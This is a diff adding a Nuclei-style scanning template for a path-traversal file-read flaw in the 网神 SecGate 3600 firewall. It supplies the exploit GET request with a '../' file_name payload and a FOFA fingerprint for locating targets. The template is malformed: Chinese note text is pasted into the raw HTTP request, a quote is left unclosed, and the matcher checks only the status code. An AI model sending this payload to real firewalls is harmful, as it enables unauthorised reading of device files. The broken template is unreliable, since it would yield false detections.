@@ -1,0 +1,37 @@
+id: poc-tsrxkggycucbzo5a
+info:
+  name: 网神 SecGate 3600 防火墙 sys_export_conf_local_save 文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tsrxkggycucbzo5a'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tsrxkggycucbzo5a
+    fofa: fid="1Lh1LHi6yfkhiO83I59AYg==
+http:
+- raw:
+  - 'GET /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds HTTP/1.1
+
+
+    Content-Length: 0
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    import_export
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
